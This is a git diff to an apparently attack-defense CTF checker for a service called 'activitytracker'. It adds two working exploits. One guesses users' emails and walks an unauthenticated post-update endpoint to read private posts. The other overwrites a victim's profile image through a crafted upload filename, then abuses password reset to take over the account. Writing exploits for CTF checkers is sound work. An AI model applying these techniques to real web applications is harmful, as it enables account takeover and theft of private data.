@@ -1,4 +1,5 @@
 #!/usr/bin/env python3
+import hashlib
 import html
 
 from enochecker import BaseChecker, BrokenServiceException, EnoException, run
@@ -9,6 +10,7 @@ import barnum
 import os
 from PIL import Image
 import secrets
+import re
 
 #### Checker Tenets
 # A checker SHOULD not be easily identified by the examination of network traffic => This one is not satisfied, because our usernames and notes are simple too random and easily identifiable.
@@ -35,6 +37,7 @@ class ActivitytrackerChecker(BaseChecker):
     flag_variants = 2
     noise_variants = 2
     havoc_variants = 2
+    exploit_variants = 2
     service_name = "activitytracker"
     port = 4242  # The port will automatically be picked up as default by self.connect and self.http.
     ##### END CHECKER PARAMETERS
@@ -175,7 +178,7 @@ class ActivitytrackerChecker(BaseChecker):
 
             self.http_get('/posts/new')
             self.http_post('/posts/insert', files={
-                "body": f"I kept forgetting my passwords, but then I discovered that they can be saved in a private post!",
+                "body": f"I keep forgetting my passwords, but I discovered that they can be saved in a private post! So useful!",
                 "visibility": "public"
             })
 
@@ -433,8 +436,111 @@ class ActivitytrackerChecker(BaseChecker):
                 If nothing is returned, the service status is considered okay.
                 The preferred way to report Errors in the service is by raising an appropriate EnoException
         """
-        # TODO: We still haven't decided if we want to use this function or not. TBA
-        pass
+        if self.variant_id == 0:
+            flag = self.exploit1()
+            if flag:
+                return flag
+            raise BrokenServiceException("Exploit does not work")
+        elif self.variant_id == 1:
+            flag = self.exploit2()
+            if flag:
+                return flag
+            raise BrokenServiceException("Exploit does not work")
+        else:
+            raise EnoException("Wrong variant_id provided")
+
+    pattern1 = re.compile("My boss (\w+ \w+) is great. .* Cheers, (\w+ \w+)")
+    pattern2 = re.compile("by (.*@.*)")
+    pattern3 = re.compile("I keep forgetting my passwords, but I discovered that they can be saved in a private post! So useful!")
+
+    def guess_boss_email(self, email, name1, name2):
+        # Guesses another user's email based on the known user's email pattern (email), the new user's full name (name1), and the known user's full name (name2)
+        email_patterns = [
+            lambda x: f"{x[0][0]}.{x[1]}",
+            lambda x: f"{x[0]}.{x[1]}",
+            lambda x: f"{x[0]}{x[1]}",
+            lambda x: f"{x[0][0]}{x[1]}",
+            lambda x: f"{x[1]}",
+            lambda x: f"{x[0]}",
+            lambda x: f"{x[0]}{x[1][0]}",
+        ]
+        user_name = name2.lower().split(" ")
+        for p in email_patterns:
+            e = p(user_name)
+            e += "@" + email.split("@")[-1]
+            if email == e:
+                return p(name1.lower().split(" ")) + "@" + email.split("@")[-1]
+
+    def exploit1(self):
+        # Create new account
+        email = f"{secrets.token_urlsafe(16)}@gmail.com"
+        password = secrets.token_urlsafe(16)
+        self.register_user(email, password)
+        resp = self.http_get(f"/posts")
+        # Split post list by user
+        user_posts = html.unescape(resp.text).split("Activities")
+        for section in user_posts:
+            # find user's email and all posts matching pattern
+            try:
+                email = re.findall(self.pattern2, section).pop().strip()
+                posts = re.findall(self.pattern1, section)
+                for post in posts:
+                    # generate email to attack
+                    email_to_attack = self.guess_boss_email(email, post[0], post[1])
+                    n = 0
+                    while True:
+                        n += 1
+                        # get flag by editing post based on known email
+                        resp = self.http_get(f"/posts/update/{email_to_attack}/{n}")
+                        if resp.status_code != 200:
+                            break
+                        t = html.unescape(resp.text)
+                        f = self.search_flag(t)
+                        if f:
+                            return f
+            except:
+                pass
+
+    def exploit2(self):
+        # Create new account
+        email = f"{secrets.token_urlsafe(16)}@gmail.com"
+        password = secrets.token_urlsafe(16)
+        self.register_user(email, password)
+        resp = self.http_get(f"/posts")
+        # Split post list by user
+        user_posts = html.unescape(resp.text).split("Activities")
+        for section in user_posts:
+            # find user's email and all posts matching pattern
+            try:
+                email = re.findall(self.pattern2, section).pop().strip()
+                posts = re.findall(self.pattern3, section)
+                for post in posts:
+                    image_name = f"tmp.png"
+                    self.generate_random_image(image_name)
+                    with open(image_name, 'rb') as image:
+                        image_upload_name = f"profiles/{email}.png"
+                        resp = self.http_post('/posts/insert', data={
+                            "body": "???",
+                            "visibility": "public"
+                        }, files={
+                            "image": (image_upload_name, image)
+                        })
+                    self.http_get('/auth/logout')
+                    with open(image_name, 'rb') as image:
+                        self.http_post('/auth/forgot', data={
+                            "email": email,
+                            "password": "hacked1234567890"
+                        }, files={
+                            "image": image
+                        })
+                    # get flag
+                    resp = self.http_get(f"/posts")
+                    t = html.unescape(resp.text)
+                    f = self.search_flag(t)
+                    if f:
+                        return f
+            except:
+                pass
 
 
 app = ActivitytrackerChecker.service  # This can be used for uswgi.
